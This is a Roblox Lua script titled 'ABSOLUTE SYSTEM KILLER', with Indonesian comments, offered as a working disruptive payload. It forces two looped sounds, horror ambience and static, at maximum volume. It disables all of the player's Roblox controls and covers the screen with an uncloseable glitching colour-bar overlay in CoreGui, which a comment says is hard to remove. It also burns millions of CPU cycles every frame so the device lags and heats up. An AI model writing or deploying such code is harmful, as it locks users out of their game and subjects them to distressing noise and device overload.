-- [[ DekaTeamHub: ABSOLUTE SYSTEM KILLER ]] --
task.spawn(function()
    -- 1. FORCE AUDIO (CARA PALING KASAR)
    local s = Instance.new("Sound", game:GetService("SoundService"))
    s.SoundId = "rbxassetid://1636151740" -- HORROR AMBIENCE (PUBLIC ID)
    s.Volume = 10
    s.Looped = true
    s:Play()
    
    local s2 = Instance.new("Sound", game:GetService("Workspace"))
    s2.SoundId = "rbxassetid://4637175245" -- STATIC NOISE (PUBLIC ID)
    s2.Volume = 10
    s2.Looped = true
    s2:Play()

    -- 2. DISABLE SEMUA TOMBOL ROBLOX (HIJACK)
    local SG = game:GetService("StarterGui")
    pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

    -- 3. VISUAL TV RUSAK (PERSIS VIDEO)
    local GUI = Instance.new("ScreenGui", game:GetService("CoreGui")) -- Pake CoreGui biar susah dihapus
    GUI.DisplayOrder = 2147483647
    GUI.IgnoreGuiInset = true

    local B = Instance.new("TextButton", GUI)
    B.Size = UDim2.new(1, 0, 1, 0)
    B.BackgroundColor3 = Color3.new(0, 0, 0)
    B.Modal = true
    B.Text = ""

    local Bars = Instance.new("Frame", B)
    Bars.Size = UDim2.new(1, 0, 1, 0)
    
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }

    for i, c in pairs(colors) do
        local f = Instance.new("Frame", Bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    -- 4. GLITCH & LAG (HP PANAS)
    game:GetService("RunService").RenderStepped:Connect(function()
        Bars.Position = UDim2.new(0, math.random(-20, 20), 0, math.random(-20, 20))
        if math.random(1, 5) == 1 then
            local n = Instance.new("Frame", B)
            n.Size = UDim2.new(1, 0, 0, math.random(5, 50))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.6
            task.delay(0.02, function() n:Destroy() end)
        end
        for i = 1, 3000000 do local _ = i * i end
    end)
end)












